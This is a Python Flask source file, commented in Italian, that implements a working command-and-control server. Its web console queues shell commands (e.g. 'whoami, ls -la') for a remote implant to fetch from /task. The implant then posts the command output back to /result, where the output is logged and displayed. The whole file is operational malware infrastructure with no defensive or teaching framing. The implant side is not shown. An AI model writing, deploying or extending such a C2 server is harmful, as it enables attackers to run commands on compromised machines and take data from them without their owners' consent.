from flask import Flask, request, render_template_string
import os
import json

app = Flask(__name__)

# File dove salviamo gli output
OUTPUT_FILE = "outputs.json"
TASK_FILE = "task.txt"

# Carica gli output precedenti se esistono
if os.path.exists(OUTPUT_FILE):
    with open(OUTPUT_FILE, "r") as f:
        outputs = json.load(f)
else:
    outputs = []

def save_outputs():
    with open(OUTPUT_FILE, "w") as f:
        json.dump(outputs, f)

HTML = '''
<!doctype html>
<html>
<head>
    <title>C2 Console</title>
    <meta http-equiv="refresh" content="3">
    <style>
        body { font-family: monospace; margin: 20px; }
        input { width: 60%; padding: 5px; }
        .output { background: #f0f0f0; margin: 10px 0; padding: 10px; border-left: 4px solid #007bff; white-space: pre-wrap; }
        .timestamp { color: gray; font-size: 0.9em; }
    </style>
</head>
<body>
    <h2>C2 Command & Control</h2>
    <form method="post" action="/cmd">
        <input type="text" name="cmd" placeholder="es. whoami, ls -la" size="60">
        <input type="submit" value="Invia comando">
    </form>
    <h3>Output ricevuti</h3>
    {% for out in outputs|reverse %}
        <div class="output">
            <div class="timestamp">{{ out.timestamp }}</div>
            <pre>{{ out.data }}</pre>
        </div>
    {% endfor %}
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(HTML, outputs=outputs)

@app.route('/cmd', methods=['POST'])
def send_cmd():
    cmd = request.form['cmd']
    with open(TASK_FILE, 'w') as f:
        f.write(cmd)
    return 'Comando inviato. Attendi qualche secondo... <a href="/">Torna</a>'

@app.route('/task', methods=['GET'])
def get_task():
    try:
        with open(TASK_FILE, 'r') as f:
            cmd = f.read().strip()
        # Cancella il task dopo averlo letto
        with open(TASK_FILE, 'w') as f:
            f.write('')
        return cmd
    except:
        return ''

@app.route('/result', methods=['POST'])
def receive_result():
    global outputs
    output_data = request.get_data(as_text=True)
    if output_data.strip():
        import datetime
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        outputs.append({"timestamp": timestamp, "data": output_data})
        save_outputs()
        print(f"[+] Output ricevuto da implant: {output_data[:80]}...")
    return 'OK'

if __name__ == '__main__':
    if not os.path.exists(TASK_FILE):
        with open(TASK_FILE, 'w') as f:
            f.write('')
    print("C2 Server avviato su http://0.0.0.0:5000")
    app.run(host='0.0.0.0', port=5000, debug=False)  # debug=False evita ricariche doppie
